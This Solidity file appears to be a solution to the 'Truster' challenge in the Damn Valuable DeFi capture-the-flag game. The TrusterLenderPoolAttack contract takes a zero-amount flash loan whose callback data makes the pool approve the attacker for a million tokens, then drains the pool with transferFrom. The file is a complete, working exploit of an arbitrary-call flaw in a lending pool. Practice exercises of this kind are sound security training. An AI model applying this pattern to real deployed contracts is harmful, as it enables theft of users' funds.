// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";
import "hardhat/console.sol";


interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract TrusterLenderPoolAttack {
    TrusterLenderPool public target;
    IERC20 public token;
    using Address for address;

    constructor(address _target, address _token) {
        target = TrusterLenderPool(_target);
        token = IERC20(_token);
    }

    function attack() external {
        // take out flashloan and have the pool give approval to me to transfer all the tokens
        // function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        bytes memory flashLoanData = abi.encodeWithSignature("approve(address,uint256)", address(this), 1000000 ether);
        target.flashLoan(0 , address(this), address(token), flashLoanData);

        // after approval, transfer the tokens from lending pool to attacker
        token.transferFrom(address(target), msg.sender, 1000000 ether);
    }
}